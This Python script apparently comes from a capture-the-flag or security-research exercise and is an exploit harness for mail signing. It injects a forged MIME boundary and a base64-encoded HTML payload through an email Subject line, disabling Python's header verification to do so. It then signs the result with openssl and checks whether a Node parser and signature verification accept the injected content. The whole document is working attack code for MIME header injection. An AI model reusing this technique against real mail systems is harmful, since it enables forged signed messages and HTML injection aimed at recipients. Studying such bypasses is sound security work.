"""Faithful reproduction of what smail.sign_message really does:
  data_unsigned = copied_msg.as_string().replace(b'\n', b'\r\n')
  signature is computed over THOSE bytes, while the message that is actually
  delivered embeds the LF version of the same content (Python's generator writes
  linesep='\n').  OpenSSL canonicalises LF -> CRLF on verify.

=> any CRLF inside our payload becomes '\r\r\n' in the signed bytes, which is
   impossible to reproduce from the delivered bytes => signature invalid.
   LF-only payloads are fine.
"""
import base64, subprocess, os, sys, json, re
sys.path.insert(0, r'.')
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email._policybase import Policy as _P
_P.verify_generated_headers = False
from _z_496_spec import PWN, BODY

EML = r'./_z_496_emls'
WSL = lambda cmd: subprocess.run(['wsl', '-d', 'kali-linux', '--', 'bash', '-lc', cmd],
                                 capture_output=True, text=True)
def w(p):
    return p.replace('\\', '/').replace('D:/', '/mnt/d/')


B1 = '=' * 15 + '177054127016892602' + '=='
b64p = base64.b64encode(PWN.encode()).decode()
TEMPLATE = open(r'./_z_496\template.jinja2').read()


def mk_D(lead):
    return (lead
            + "\n--" + B1 + " \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n"
            + b64p + "\n--" + B1 + "-- "
            + "\nContent-Transfer-Encoding : 7bit")


def run(lead, tag):
    D = mk_D(lead)
    content = TEMPLATE.replace('{{ title }}', 'Re: ' + D).replace('{{ content }}', BODY)
    inner = ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
             'MIME-Version: 1.0\n\n'
             '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
             + content + '\n'
             '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
             + content + '\n'
             '--' + B1 + '--\n')
    to_sign = inner.replace('\n', '\r\n')
    p_in = os.path.join(EML, 'inner_%s.txt' % tag)
    p_sg = os.path.join(EML, 'signed_%s.eml' % tag)
    open(p_in, 'w', newline='', encoding='utf-8').write(to_sign)
    r = WSL('cd /tmp/ostest && openssl cms -sign -in %s -signer cert.pem -inkey key.pem -outform SMIME -out %s -md sha256'
            % (w(p_in), w(p_sg)))
    if r.returncode != 0:
        print(tag, 'sign failed', r.stderr[:300]); return
    signed = open(p_sg, encoding='utf-8', newline='').read()
    B2 = re.search(r'boundary="([^"]+)"', signed).group(1)
    i1 = signed.index('--' + B2 + '\n') + len('--' + B2 + '\n')
    i2 = signed.index('--' + B2 + '\n', i1) - 1
    embedded = signed[i1:i2]
    print('== %s ==  embedded == to_sign ? %s' % (tag, embedded == to_sign))
    body = signed[:i1] + inner + signed[i2:]

    msg = MIMEMultipart('signed', protocol='application/pkcs7-signature', micalg='sha-256')
    msg.set_boundary(B2)
    msg['From'] = 'admin@ses'
    msg['To'] = 'admin@ses'
    msg['Subject'] = 'Re: ' + D
    head = msg.as_string().split('\n\n', 1)[0]
    reply = head + '\n\n' + body[body.index('This is an S/MIME signed message'):]
    p_rep = os.path.join(EML, 'reply_%s.eml' % tag)
    open(p_rep, 'w', newline='', encoding='utf-8').write(reply)

    r = WSL('node ./_z_496_parse.js %s' % w(p_rep))
    try:
        j = json.loads(r.stdout)
        print('  TOP: html truthy=%s  html[:60]=%r' % (bool(j.get('html')), (j.get('html') or '')[:60]))
    except Exception:
        print('  TOP parse fail', r.stdout[:200], r.stderr[:200])
    r = WSL('cd /tmp/ostest && openssl cms -verify -in %s -CAfile cert.pem -out %s; echo RC=$?'
            % (w(p_rep), w(p_rep + '.out')))
    print('  verify:', [l for l in r.stdout.splitlines() if l.startswith('RC=') or 'CMS' in l or 'error' in l.lower()][:3])
    if 'RC=0' in r.stdout:
        r2 = WSL('node ./_z_496_parse.js %s' % w(p_rep + '.out'))
        try:
            j2 = json.loads(r2.stdout)
            print('  VERIFIED: html == PWN:', j2.get('html') == PWN)
        except Exception:
            print('  VERIFIED parse fail', r2.stdout[:200])


run("\n\n", 'lf')
run("\r\n\r\n", 'crlf')
